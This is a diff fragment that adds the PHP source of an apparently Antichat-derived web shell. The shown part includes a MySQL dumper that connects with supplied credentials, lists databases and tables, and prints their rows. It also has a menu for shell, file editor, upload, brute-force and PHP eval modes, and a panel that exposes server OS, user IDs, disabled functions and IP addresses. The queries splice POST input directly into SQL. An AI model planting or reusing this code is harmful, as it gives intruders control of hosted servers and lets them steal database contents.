+$content .=(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"));
+$content .=">&nbsp;Пароль: &nbsp;<input type=text name=mysql_p size=15 value=";
+$content .=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"));
+$content .="><input type=hidden name=dir size=85 value=".$dir.">
+<input type=hidden name=cmd size=85 value=mysql_dump>
+<br>&nbsp;Сохранить дамп в файле: <input type=checkbox name=dif value=1 id=dif><input type=text name=dif_name size=80 value=";
+$content .=(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"));
+$content .="><input type=submit name=submit value=Сохранить></form>";
+
+@$php_self = $_POST['PHP_SELF'];
+@$from = $_POST['from'];
+@$to = $_POST['to'];
+@$adress = $_POST['adress'];
+@$port = $_POST['port'];
+@$login = $_POST['login'];
+@$pass = $_POST['pass'];
+@$adress = $_POST['adress'];
+@$port = $_POST['port'];
+@$login = $_POST['login'];
+@$pass = $_POST['pass'];
+if(!isset($adress)){
+	$adress="localhost";
+}
+if(!isset($login)){
+	$login="root";
+}
+if(!isset($pass)){
+	$pass="";
+}
+if(!isset($port)){
+	$port="3306";
+}
+if(!isset($from)){
+$from=0;
+}
+if(!isset($to)){
+	$to=50;
+}
+
+if(!@$conn) {
+$content .="<form name='mysql_dump' action='$php_self' method='post'>
+<table><tr><td valign=top>
+<input type='hidden' name='action' value='$action'>
+<input type=hidden name=ac value=sql>
+<tr><td valign=top>Хост: &nbsp;&nbsp;&nbsp;&nbsp;<input name=adress value='$adress' size=20>
+<tr><td valign=top>Порт: &nbsp;&nbsp;&nbsp;&nbsp;<input name=port value='$port' size=20>
+<tr><td valign=top>Логин: &nbsp;&nbsp;<input name=login value='$login' size=20>
+<tr><td valign=top>Пароль: <input name=pass value='$pass' size=20>
+<input type=hidden name=p value=sql></td></tr>
+<tr><td></td><td><input type=submit name=conn value=Подключиться></form></td></tr>
+</table>";
+}
+@$conn = $_POST['conn'];
+@$adress = $_POST['adress'];
+@$port = $_POST['port'];
+@$login = $_POST['login'];
+@$pass = $_POST['pass'];
+if($conn){
+
+$serv = @mysql_connect("$adress:$port", "$login", "$pass") or die("ОШИБКА: ".mysql_error());
+if($serv) {
+$content .="<form name='conn' action='$php_self' method='post'><input type=hidden name=conn value=0>
+<input type='hidden' name='action' value='$action'>
+Статус: Подключен : <input type=submit name=exit value='Выйти из базы'></form>
+<table><tr><td><font color=red>[Таблицы]</font><br></br>";
+}
+$res = mysql_list_dbs($serv);
+while ($str=mysql_fetch_row($res)){
+$content .= "<table><a href=\"#\" onclick=\"document.dump1.db.value='$str[0]';document.dump1.tbl.value='$str[0]';document.dump1.submit();\">$str[0]</a></table>";
+@$tc++;
+}
+$content .="<form name='dump1' action='$php_self' method='POST'>
+<input type='hidden' name='action' value='$action'>
+<input type=hidden name=ac value=sql>
+<input name=base value='1' type=hidden>
+<input name=db value='$str[0]' type=hidden>
+<input name=p value='sql' type=hidden>
+<input name=adress value='$adress' type=hidden>
+<input name=port value='$port' type=hidden>
+<input name=login value='$login' type=hidden>
+<input name=pass value='$pass' type=hidden>
+<input name=conn value='1' type=hidden>
+<input name=tbl value='$str[0]' type=hidden></form>";
+
+@$base = $_POST['base'];
+@$db = $_POST['db'];
+$content .="<br></br><font color=red>[Всего таблиц: $tc]</font>";
+if($base){
+$content .="<br></br><font color=red>Таблица: [$tbl]</font><br>";
+$result = mysql_list_tables($db);
+while($str=mysql_fetch_array($result)){
+$c = mysql_query ("SELECT COUNT(*) FROM $str[0]");
+$records = mysql_fetch_array($c);
+$content .="<table><font color=red>[$records[0]]</font><a href=\"#\" onclick=\"document.dump2.vn.value='$str[0]';document.dump2.tbl.value='$str[0]';document.dump2.submit();\">$str[0]</a></table>";
+mysql_free_result($c);
+}}
+$content .="<form name='dump2' action='$php_self' method='post'>
+<input type='hidden' name='action' value='$action'>
+<input type=hidden name=ac value=sql>
+<input name=inside value='1' type=hidden>
+<input name=base value='1' type=hidden>
+<input name=vn value='$str[0]' type=hidden>
+<input name=db value='$db' type=hidden>
+<input name=p value='sql' type=hidden>
+<input name=adress value='$adress' type=hidden>
+<input name=port value='$port' type=hidden>
+<input name=login value='$login' type=hidden>
+<input name=pass value='$pass' type=hidden>
+<input name=tbl value='$str[0]' type=hidden>
+<input name=conn value='1' type=hidden></form>";
+
+@$vn = $_POST['vn'];
+$content .= "<td valign=top>База данных: $db => $vn<br>";
+@$inside = $_POST['inside'];
+@$tbl = $_POST['tbl'];
+if($inside){
+$content .= "<table cellpadding=0 cellspacing=1><tr>";
+
+mysql_select_db($db) or die(mysql_error());
+$c = mysql_query ("SELECT COUNT(*) FROM $tbl");
+$cfa = mysql_fetch_array($c);
+mysql_free_result($c);
+$content .= "Всего: $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>
+<input type='hidden' name='action' value='$action'>
+<input type=hidden name=ac value=sql>
+От: <input name=from size=3 value=0>
+До: <input name=to size=3 value=$cfa[0]>
+<input type=submit name=show value='Загрузить'>
+<input type=hidden name=inside value=1>
+<input type=hidden name=vn value=$vn>
+<input type=hidden name=db value=$db>
+<input type=hidden name=login value=$login>
+<input type=hidden name=pass value=$pass>
+<input type=hidden name=adress value=$adress>
+<input type=hidden name=conn value=1>
+<input type=hidden name=base value=1>
+<input type=hidden name=p value=sql>
+<input type=hidden name=tbl value=$tbl>
+</form>";
+@$vn = $_POST['vn'];
+@$from = $_POST['from'];
+@$to = $_POST['to'];
+@$from = $_POST['from'];
+@$to = $_POST['to'];
+if(!isset($from)){
+	$from=0;
+}
+if(!isset($to)){
+	$to=50;
+}
+$query = "SELECT * FROM $vn LIMIT $from,$to";
+$result = mysql_query($query);
+for ($i=0;$i<mysql_num_fields($result);$i++){
+$name = mysql_field_name($result,$i);
+$content .="<td>&nbsp;</td><td bgcolor=#44474f><font color=red> $name </font></td> ";
+}
+while($mn = mysql_fetch_array($result, MYSQL_ASSOC)){
+$content .= "<tr>";
+foreach ($mn as $come=>$lee) {
+$nst_inside = htmlspecialchars($lee);
+$content .= "<td>&nbsp;</td><td bgcolor=#44474f>$nst_inside</td>\r\n";
+}
+}
+mysql_free_result($result);
+$content .= "</table>";
+}}}
+
+//end function
+
+?><?=$header;?>
+
+<table width="100%" bgcolor="#31333b"  align="right" border="0" cellspacing="0" cellpadding="0"><tr><td>
+<table><tr><td><a href="#" onclick="document.reqs.action.value='shell';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Shell |. </a></td>
+<td><a href="#" onclick="document.reqs.action.value='viewer';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Viewer |.</a></td>
+<td><a href="#" onclick="document.reqs.action.value='editor';document.reqs.file.value='<?=$file;?>';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Editor |.</a></td>
+<td><a href="#" onclick="document.reqs.action.value='upload';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Upload |.</a></td>
+<td><a href="#" onclick="document.reqs.action.value='brute';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Brute |.</a></td>
+<td><a href="#" onclick="document.reqs.action.value='mysql';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Mysql Dumper|.</a></td>
+<td><a href="#" onclick="document.reqs.action.value='phpeval';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Php Eval |.</a></td>
+<td><a href="#" onclick="history.back();">.| <-back |.</a></td><td><a href="#" onclick="history.forward();">.| forward->|.</a></td></tr></table>
+</td></tr></table>
+<br /><form name='reqs' method='POST'><input name='action' type='hidden' value=''><input name='dir' type='hidden' value=''><input name='file' type='hidden' value=''></form>
+<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#363940 borderColorLight=#c0c0c0 border=1>
+<tr><td>Safe mode: <?php echo $safe_mode;?><br>Disable functions: <?php echo $disfunc;?><br>OS: <?php echo @php_uname();?><br>Server: <?php echo @getenv("SERVER_SOFTWARE")?>
+<br>Id: <?php echo "Uid=".getmyuid(). " Gid=".getmygid(); ?><br><? echo 'Server: '.@gethostbyname($_SERVER["HTTP_HOST"]).' You: '.$_SERVER['REMOTE_ADDR'].' XFF: '.@gethostbyaddr($HTTP_X_FORWARDED_FOR).' ';?>
+<br> Status: <?php echo @$stdata;?></td></tr></table>
+<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#363940 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><?=$content;?>
+<br></table>
+<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#44474f BORDER=1 width=100% align=center bordercolor=#808080 bordercolorlight=black bordercolordark=#44474f><tr><td>
+<center><font color='#9acd32' face='Tahoma' size = 1><b>| Copyright by <a href="http://www.antichat.ru" title="antichat">Antichat.ru</a> | Made by Grinay | Modified by <s>Go0o$E</s><br/>Last update by <b>Isis</b> |</b></font></center></td></tr></table>
+
+<?=$footer;?>
